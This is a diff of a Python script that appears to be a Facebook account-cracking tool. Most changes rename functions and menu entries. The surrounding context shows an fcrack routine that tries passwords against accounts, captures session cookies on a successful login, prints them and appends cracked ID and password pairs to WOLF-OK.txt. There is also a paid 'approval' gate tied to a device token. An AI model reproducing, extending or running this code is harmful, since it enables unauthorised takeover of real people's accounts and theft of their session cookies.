@@ -1256,7 +1256,7 @@ def ali_khan():
 
 #_______
 
-def malik_baloch():
+def wolf_boy():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1326,7 +1326,7 @@ def pubg():
 
 #____
 
-def ff():
+def free_fire():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1361,7 +1361,7 @@ def ff():
 
 #___________
 
-def bd():
+def bangladeh():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1394,7 +1394,7 @@ def bd():
 	input('Press Inter To Back Menu')
 	rehan()
 
-def chos():
+def choose():
     user=[]
     twf =[]
     os.getuid
@@ -1507,7 +1507,7 @@ def fcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[WOLF-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🥰]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\033[1;32m[WOLF-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🥰]\033[0;93m COOKIES = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 open('WOLF-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
@@ -1526,7 +1526,7 @@ def fcrack(uid,pwx,tl):
     except:
         pass
         
-def approval():
+def SUBSCRIPTION():
   os.system('clear')
   print(logo)
   uuid = str(os.geteuid()) + str(os.getlogin())
@@ -1551,7 +1551,7 @@ def approval():
       input('IF U WANT TO BUY THEN PRESS ENTER ')
       tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://facebook.com/ifad.ibrahim.8'+tks),approval()
       time.sleep(1)
-      approval()
+      SUBSCRIPTION()
   except:
     sys.exit()
 
